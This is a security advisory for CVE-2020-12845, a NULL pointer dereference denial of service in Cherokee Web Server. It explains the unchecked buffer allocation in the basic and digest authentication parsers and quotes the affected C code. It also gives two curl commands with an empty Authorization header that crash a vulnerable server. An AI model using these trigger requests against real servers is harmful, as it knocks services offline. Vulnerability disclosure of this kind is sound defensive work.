# CVE-2020-12845: Denial of Service in Cherokee Web Server

Cherokee Web Server [1,2] 0.4.27 to 1.2.104 is affected by a denial of service due to a NULL pointer dereferences [3]. A remote unauthenticated attacker can crash the server by sending an HTTP request to protected resources using a malformed `Authorization` header.

## Details
Cherokee Web Server 0.4.27 to 1.2.104 have a NULL pointer dereference which leads to a denial of service.
Any server that has HTTP authentication (either basic or digest) enabled and paths that respond with the `WWW-Authenticate` header, can be crashed by an unauthenticated and remote attacker by sending a malformed `Authorization` header to such paths.

The following commands are used to generate HTTP requests that trigger the vulnerability

```
1) curl -H "Authorization: Basic " <url>
2) curl -H "Authorization: Digest " <url>
```
`cherokee_buffer_add` does not allocate memory if the the size of the input string is less or equal to zero and return `ret_ok` nonetheless.

`cherokee_validator_parse_digest` and `cherokee_validator_parse_basic` do not have any checks on the return value from `cherokee_buffer_add` and will later dereference an uninitialized pointer (read and write), at `validator.c:180`

```
ret_t
cherokee_validator_parse_digest (cherokee_validator_t *validator,
                                 char *str, cuint_t str_len)
{
	cuint_t             len;
	char               *end;
	char               *entry;
	char               *comma;
	char               *equal;
	cherokee_buffer_t   auth = CHEROKEE_BUF_INIT;
	cherokee_buffer_t  *entry_buf;

	/* Copy authentication string
	 */
	cherokee_buffer_add (&auth, str, str_len);

	entry = auth.buf;
	end   = auth.buf + auth.len;

	do {
		/* Skip some chars
		 */
		while ((*entry == CHR_SP) ||
		       (*entry == CHR_CR) ||
		       (*entry == CHR_LF)) entry++;
.
.
.
```
and in a call to `cherokee_buffer_decode_base64` (illegal write at `buffer.c:1681`) respectively

```
ret_t
cherokee_validator_parse_basic (cherokee_validator_t *validator, char *str, cuint_t str_len)
{
	char              *colon;
	cherokee_buffer_t  auth = CHEROKEE_BUF_INIT;

	/* Decode base64
	 */
	cherokee_buffer_add (&auth, str, str_len);
	cherokee_buffer_decode_base64 (&auth);
.
.
.
```


## References
[1] Cherokee Web Server - https://cherokee-project.com/

[2] Cherokee Web Server Github - https://github.com/cherokee/webserver

[3] CVE-2020-12845 - https://nvd.nist.gov/vuln/detail/CVE-2020-12845
